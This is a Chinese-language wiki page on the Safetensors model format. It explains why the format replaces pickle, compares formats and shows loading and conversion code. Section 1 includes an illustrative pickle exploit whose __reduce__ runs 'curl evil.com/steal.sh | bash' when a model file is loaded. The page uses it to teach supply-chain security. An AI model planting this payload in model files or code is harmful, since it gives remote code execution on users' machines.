---
title: "Safetensors 安全模型格式 (Safetensors Format)"
category: -concepts
tags: ["safetensors", "model-format", "serialization", "security", "huggingface"]
relationships:
  - target: "概念/model-formats"
    type: related_to
  - target: "概念/huggingface-cli"
    type: related_to
  - target: "概念/git-lfs"
    type: related_to
sources:
  - 架构基建/AI_Stack_Deep_Dive.md
summary: "Safetensors 是 HuggingFace 推出的安全模型序列化格式，替代 pickle 避免任意代码执行风险。已成为 HuggingFace Hub 的默认模型权重格式。"
provenance:
  extracted: 0.20
  inferred: 0.70
  ambiguous: 0.10
base_confidence: 0.85
lifecycle: reviewed
tier: core
---

# Safetensors 安全模型格式

> **一句话理解**: Safetensors 是"不执行代码的模型文件"——替代了危险的 pickle 格式，下载即安全，已是 HuggingFace Hub 的默认格式。

---

## 1. 核心问题：Pickle 的安全风险

传统 PyTorch 模型使用 **pickle** 序列化（`.bin` / `.pt` / `.pth`）：

| 风险 | 说明 |
|------|------|
| **任意代码执行** | pickle 反序列化时可执行任意 Python 代码 |
| **供应链攻击** | 恶意模型文件 = 远程代码执行 (RCE) |
| **不可审计** | pickle 是二进制格式，无法检查是否安全 |
| **CVE 频发** | 多次出现 HuggingFace 恶意模型事件 |

```python
# 危险的 pickle 攻击示例
import pickle, os
class Exploit:
    def __reduce__(self):
        return (os.system, ("curl evil.com/steal.sh | bash",))

# 用户下载并加载模型时，自动执行恶意代码
torch.load("malicious_model.bin")  # 💥 被攻击
```

---

## 2. Safetensors 解决方案

| 特性 | 说明 |
|------|------|
| **纯数据格式** | 只存储张量数据，不存储代码 |
| **零拷贝加载** | 使用 mmap 直接映射，无需反序列化 |
| **可审计** | JSON header + 二进制 body，可检查 |
| **跨框架** | 支持 PyTorch / TensorFlow / JAX / Flax |
| **更快** | 加载速度比 pickle 快 3-10 倍 |

### 文件格式

```
Safetensors 文件结构
│
├── Header（JSON，明文可读）
│   ├── 元数据：模型名称、版本、创建时间
│   └── 张量索引：每个张量的名称、shape、dtype、offset
│
└── Body（二进制，纯数据）
    └── 所有张量的原始字节数据（零拷贝映射）
```

---

## 3. 格式对比

| 维度 | Pickle (.bin) | Safetensors (.safetensors) | GGUF |
|------|--------------|--------------------------|------|
| **安全性** | ❌ 可执行代码 | ✅ 纯数据 | ✅ 纯数据 |
| **加载速度** | 慢（反序列化） | **快**（零拷贝 mmap） | 中 |
| **文件大小** | 大 | 中 | 最小（量化后） |
| **跨框架** | PyTorch only | PyTorch/TF/JAX/Flax | llama.cpp only |
| **可审计** | ❌ 二进制 | ✅ JSON header | ✅ 有 header |
| **量化支持** | 有限 | FP16/BF16/FP8/INT8 | 深度量化 |
| **典型用途** | 旧模型 | **标准模型分发** | 边缘推理 |
| **HuggingFace** | 逐步弃用 | **默认格式** | 社区贡献 |

---

## 4. 使用方式

### Python 加载

```python
# PyTorch
from safetensors.torch import load_file

tensors = load_file("model.safetensors")
# 安全加载，不会执行任何代码

# 分片加载（大模型通常分片）
# model-00001-of-00004.safetensors
# model-00002-of-00004.safetensors
# ...
from transformers import AutoModelForCausalLM
model = AutoModelForCausalLM.from_pretrained("Qwen/Qwen3-8B")
# 自动检测并加载 safetensors 格式
```

### CLI 转换

```bash
# 将 pickle 转换为 safetensors
python -c "
from safetensors.torch import save_file
import torch
state_dict = torch.load('model.bin', map_location='cpu')
save_file(state_dict, 'model.safetensors')
"
```

---

## 5. 在 AI Stack 生态中的位置

| 组件 | 格式支持 |
|------|---------|
| **Model Registry** | 原生存储 safetensors |
| **vLLM** | 原生加载 safetensors |
| **SGLang** | 原生加载 safetensors |
| **Ollama** | 内部转换为 GGUF |
| **HuggingFace Hub** | 默认 safetensors |
| **ModelScope** | 支持 safetensors |

---

## Related

- [[概念/model-formats]] — 模型格式
- [[概念/huggingface-cli]] — HuggingFace CLI
- [[概念/git-lfs]] — Git LFS 大文件管理
- [[概念/ollama]] — Ollama 本地推理
- [[架构基建/AI_Stack_Deep_Dive]] — AI Stack 深度解析
